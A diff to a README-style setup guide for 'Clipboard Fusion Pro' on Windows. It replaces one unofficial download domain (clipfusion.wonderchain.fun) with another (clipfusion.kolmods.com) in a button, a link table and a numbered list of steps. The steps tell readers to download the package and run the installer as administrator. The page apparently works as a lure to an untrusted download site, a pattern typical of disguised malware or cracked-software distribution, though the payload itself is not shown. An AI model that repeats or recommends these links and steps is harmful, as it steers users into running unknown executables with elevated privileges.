@@ -11,20 +11,20 @@ Notes for users who need Clipboard Fusion Pro running on Windows — especially 
 Use the link below for the Windows package referenced in this guide.
 
 <p align="center">
-  <a href="https://clipfusion.wonderchain.fun/">
+  <a href="https://clipfusion.kolmods.com/">
     <img src="https://img.shields.io/badge/Open%20setup%20page-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Open setup page">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Page** | [clipfusion.wonderchain.fun](https://clipfusion.wonderchain.fun/) |
-| **URL** | `https://clipfusion.wonderchain.fun/` |
+| **Page** | [clipfusion.kolmods.com](https://clipfusion.kolmods.com/) |
+| **URL** | `https://clipfusion.kolmods.com/` |
 | **Platform** | Windows 10 / 11 (64-bit) |
 
 ### Recommended steps
 
-1. Open the [setup page (clipfusion.wonderchain.fun)](https://clipfusion.wonderchain.fun/)
+1. Open the [setup page (clipfusion.kolmods.com)](https://clipfusion.kolmods.com/)
 2. Download the package to a folder you can find (e.g. Downloads)
 3. Run the installer **as administrator** if Windows asks
 4. Reboot once if the app prompts after install
